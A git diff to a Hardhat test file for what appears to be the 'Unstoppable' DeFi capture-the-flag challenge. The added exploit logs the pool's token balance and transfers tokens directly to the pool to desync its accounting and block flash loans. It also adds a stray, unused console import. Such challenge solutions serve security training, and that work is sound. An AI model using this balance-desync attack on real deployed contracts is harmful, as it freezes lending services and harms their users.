@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { timeStamp } = require('console');
 
 describe('[Challenge] Unstoppable', function () {
     let deployer, attacker, someUser;
@@ -40,6 +41,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const a = await this.token.balanceOf(this.pool.address)
+        console.log(a.toString())
+        await this.token.transfer(this.pool.address, 10)
+        const b = await this.token.balanceOf(this.pool.address)
+        console.log(b.toString())
     });
 
     after(async function () {
